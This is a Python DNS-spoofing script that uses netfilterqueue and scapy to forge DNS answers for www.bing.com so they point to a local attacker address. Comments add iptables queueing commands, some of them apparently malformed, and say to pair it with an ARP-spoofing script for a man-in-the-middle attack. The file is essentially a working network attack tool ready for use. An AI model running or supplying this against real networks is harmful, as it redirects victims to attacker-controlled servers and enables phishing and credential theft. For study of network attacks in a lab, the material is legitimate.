#!/usr/bin/env python


import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    #   print(packet.get_payload())
    # We will need to be able to convert the packet.get_payload to a scapy packet
    # to modify and analyze specific layers that we want and send the requests and
    # responses that we want
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.113")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # We remove the cheksum and len so the packet is able to recalculate both fields
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # If we convert the packet we will be able to convert the original packet to the modificated one
            packet.set_payload(str(scapy_packet))

        # print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# Bind to queue num and a call back function for trapped packets
queue.bind(0, process_packet)
queue.run()


# packet.accept()
# packet.drop()

# iptables -i OUTPUT -j NFQUEUE --queue-num 0
# iptables -i INPUT -j NFQUEUE --queue-num 0
# service apache2 start

# [FOR MAN IN THE MIDDLE]
# to remove ip tables and clear them :
# iptables --flush
# iptables -I ACCEPT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# execute arp_spoof.py

# service apache2 start
# ping -c 1 www.bing.com
